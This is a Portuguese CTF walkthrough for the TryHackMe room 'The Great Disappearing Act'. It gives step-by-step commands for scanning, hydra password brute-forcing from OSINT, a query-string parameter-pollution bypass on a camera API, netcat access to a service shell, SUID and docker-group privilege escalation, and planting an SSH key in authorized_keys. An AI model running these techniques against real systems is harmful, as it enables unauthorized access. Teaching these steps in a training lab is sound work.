# Side Quest 1 - The Great Disappearing Act

Este guia acompanha a sala [The Great Disappearing Act](https://tryhackme.com/room/sq1-aoc2025-FzPnrt2SAu), missão opcional do Advent of Cyber 2025. O objetivo é libertar Hopper de HopSec Asylum, obter três flags e verificar as três no terminal de saída. A chave de entrada fica na imagem descoberta pelo [desafio opcional do dia 1](../advent-of-cyber-2025/dia-01-linux-cli-shells-bells.md#desafio-opcional-chave-da-side-quest-1). O guia usa uma máquina Linux própria conectada à VPN do TryHackMe.

## 1. Reconhecimento da máquina alvo

Inicie **Lab Machine** na sala, copie o IP e faça uma varredura de todas as portas TCP. A máquina desta missão concentra vários serviços no mesmo endereço. A porta `80` apresenta um console estático, enquanto a aplicação de login funcional responde em `8080`.

```bash
export IP=10.x.x.x  # substitua pelo IP da sua Lab Machine
ip route get "$IP"
nmap -Pn -sT -n -p- --open "$IP"
curl -I "http://$IP:80/"
curl -I "http://$IP:8080/"
```

Preste atenção a `8000` (Fakebook), `8080` (console do asilo), `13400` (portal de câmeras), `13401` (API das câmeras) e `13404` (console de operações). Uma varredura limitada às mil portas mais comuns não encontra a maior parte da missão.

## 2. OSINT no Fakebook e primeira flag

Abra `http://<IP>:8000/`. Se o Fakebook pedir autenticação, crie uma conta de teste dentro do laboratório para ler as postagens. Procure os textos e comentários de **Guard Hopkins**. Eles expõem o e-mail usado no trabalho, um antigo padrão de senha, o nome do cachorro e o ano de nascimento. Uma resposta do próprio guarda informa que ele trocou a senha antiga.

Monte uma pequena lista de candidatos combinando os dados pessoais com o padrão observado. Teste-a apenas contra o login real do console, em `8080/cgi-bin/login.sh`. O texto `Invalid username or password` distingue as tentativas malsucedidas. O exemplo usa `hydra`, mas uma sequência curta de requisições `curl` também basta.

```bash
cat > candidatos.txt <<'EOF'
<NOME_DO_CACHORRO><ANO>!
<NOME_DO_CACHORRO><ANO>$
<COMIDA_FAVORITA><ANO>!
<COMIDA_FAVORITA><ANO>$
EOF

hydra -s 8080 -t 4 -f \
  -l '<EMAIL_DO_GUARDA>' -P candidatos.txt "$IP" \
  http-post-form '/cgi-bin/login.sh:username=^USER^&password=^PASS^:Invalid username or password'
```

Com as credenciais encontradas, entre em `http://<IP>:8080/`, escolha a chave de **Cells / Storage** e clique em **Unlock Cell Door**. O serviço devolve a primeira flag. Também é possível reproduzir a chamada do botão pelo terminal, mantendo o cookie de sessão:

```bash
export GUARD_USER='<EMAIL_DO_GUARDA>'
export GUARD_PASS='<SENHA_DESCOBERTA>'
curl -s -c cookies.txt -X POST "http://$IP:8080/cgi-bin/login.sh" \
  --data-urlencode "username=$GUARD_USER" \
  --data-urlencode "password=$GUARD_PASS"
curl -s -b cookies.txt "http://$IP:8080/cgi-bin/key_flag.sh?door=hopper"
```

Anote a flag completa para o terminal final e para o primeiro campo do TryHackMe.

Resposta: `THM{h0p...}`

## 3. Falha de parâmetros na API de vídeo

O mapa indica câmeras ativas. O portal `http://<IP>:13400/` aceita a mesma conta do guarda. Sua interface lista `cam-admin` como câmera restrita da saída da ala psiquiátrica. O JavaScript do portal mostra que ele pede um ticket em `/v1/streams/request` e usa o ticket para abrir um manifesto HLS.

Consulte a API diretamente. Primeiro obtenha o token da conta do guarda:

```bash
export TOKEN=$(curl -s -X POST "http://$IP:13401/v1/auth/login" \
  -H 'Content-Type: application/json' \
  --data-binary "{\"username\":\"$GUARD_USER\",\"password\":\"$GUARD_PASS\"}" \
  | python3 -c 'import json,sys; print(json.load(sys.stdin)["token"])')

curl -s "http://$IP:13401/v1/cameras" \
  -H "Authorization: Bearer $TOKEN"
```

Alterar a função `guard` dentro do token quebra a assinatura. O problema está na interpretação de `tier`: a API valida o valor `guard` no corpo JSON, mas aceita `admin` na query string da mesma requisição. Compare uma requisição comum com a que duplica o parâmetro:

```bash
curl -s -X POST "http://$IP:13401/v1/streams/request" \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"camera_id":"cam-admin","tier":"admin"}'

export TICKET=$(curl -s -X POST \
  "http://$IP:13401/v1/streams/request?tier=admin" \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"camera_id":"cam-admin","tier":"guard"}' \
  | python3 -c 'import json,sys; print(json.load(sys.stdin)["ticket_id"])')

curl -s "http://$IP:13401/v1/streams/$TICKET/manifest.m3u8" \
  -H "Authorization: Bearer $TOKEN" | head -n 25
```

A primeira requisição recebe um ticket efetivo de guarda; a segunda deve mostrar `effective_tier` igual a `admin`. O manifesto restrito contém segmentos `.ts` e metadados de diagnóstico. Baixe o começo do vídeo com o [script de captura HLS criado para esta missão](scripts/capturar_hls.py) e extraia quadros com `ffmpeg`. Para executar o script, clone o repositório e entre na pasta desta Side Quest:

```bash
git clone https://github.com/RenatoCDM/guias-tryhackme-ptbr.git
cd guias-tryhackme-ptbr/series/advent-of-cyber/advent-of-cyber-2025-sidequest
# Se necessário: sudo apt install python3-requests ffmpeg
python3 scripts/capturar_hls.py "$IP" "$TOKEN" "$TICKET" camera-admin.ts
ffmpeg -hide_banner -loglevel error -i camera-admin.ts \
  -vf 'fps=4,scale=1000:-1' quadro-%03d.png
```

Examine a sequência dos quadros para identificar os **seis dígitos** digitados no teclado. Se algum toque estiver ambíguo por causa da compressão, guarde a tentativa e confira o código mais tarde no script `psych_check.sh` do próprio host, após obter o acesso de manutenção na etapa 5. O teclado limita tentativas, então evite adivinhar muitos números. Envie o código no **Psych Ward Exit Key** do mapa ou pela chamada abaixo. A resposta traz **somente a primeira metade da segunda flag**.

```bash
curl -s -b cookies.txt -X POST "http://$IP:8080/cgi-bin/psych_check.sh" \
  --data-urlencode 'code=<SEIS_DIGITOS_DO_VIDEO>'
```

## 4. Metadados HLS e console de operações

No manifesto da câmera restrita, procure `hopsec.diagnostics`, `hopsec.jobs` e o exemplo `X-RTSP-EXAMPLE`. O serviço de diagnóstico usa esse endereço RTSP para criar uma tarefa. Consulte o resultado até o campo `status` ficar `ready`:

```bash
export JOB=$(curl -s -X POST "http://$IP:13401/v1/ingest/diagnostics" \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"rtsp_url":"rtsp://vendor-cam.test/cam-admin"}' \
  | python3 -c 'import json,sys; print(json.load(sys.stdin)["job_id"])')

curl -s "http://$IP:13401/v1/ingest/jobs/$JOB" \
  -H "Authorization: Bearer $TOKEN"
```

Copie o `token` retornado pela tarefa e conecte-se à porta `13404`. Ela pede o token como primeira linha; depois abre um shell de `svc_vidops`. Leia `user_part2.txt` para obter a segunda metade da flag. Una-a à primeira metade sem inserir espaços ou uma nova chave `THM{`.

```bash
nc "$IP" 13404
# cole o token da tarefa e pressione Enter
id
cat /home/svc_vidops/user_part2.txt
```

Envie a segunda flag completa ao TryHackMe.

Resposta: `THM{Y0u...}`

## 5. Acesso de manutenção e código do portão

No shell de `svc_vidops`, procure executáveis com bit SUID. `diag_shell` inicia uma sessão com o UID efetivo de `dockermgr`, mas ainda conserva o grupo original. A conta `dockermgr` pertence ao grupo `docker`, então uma nova sessão SSH permite usar esse grupo:

```bash
find / -type f -perm -4000 2>/dev/null | grep diag_shell
ls -l /usr/local/bin/diag_shell
id dockermgr
/usr/local/bin/diag_shell
id
```

Gere uma chave temporária **na sua máquina Linux**, copie apenas a chave pública e adicione-a a `authorized_keys` dentro do shell de `dockermgr` no laboratório:

```bash
# Na sua máquina Linux:
ssh-keygen -q -t ed25519 -f /tmp/sq1_id -N ''
cat /tmp/sq1_id.pub

# No shell de dockermgr no laboratório:
mkdir -p /home/dockermgr/.ssh
chmod 700 /home/dockermgr/.ssh
printf '%s\n' '<CHAVE_PUBLICA_GERADA>' >> /home/dockermgr/.ssh/authorized_keys
chmod 600 /home/dockermgr/.ssh/authorized_keys
```

Abra uma nova sessão a partir da sua máquina Linux. `id` deve agora incluir o grupo `docker`. Liste os contêineres e leia o código do terminal SCADA dentro de `asylum_gate_control`:

```bash
ssh -i /tmp/sq1_id dockermgr@"$IP"
id
docker ps
docker exec asylum_gate_control \
  grep -n UNLOCK_CODE /opt/scada/scada_terminal.py
```

Use o código numérico encontrado no **Asylum Exit Key** do mapa. A resposta do serviço fornece a terceira flag. Se for necessário conferir os seis dígitos da ala psiquiátrica, examine também `psych_check.sh` no host a partir do contêiner; não force o teclado às cegas.

Resposta: `THM{p0p...}`

## 6. Fuga e confirmação

No mapa, informe as três flags no **Exit Facility**. O laboratório confirma a fuga e mostra um convite para outra missão opcional. Na página da sala, preencha os três campos de resposta com as flags obtidas, esperando alguns segundos entre as submissões. Confirme que o progresso chegou a **100%**.
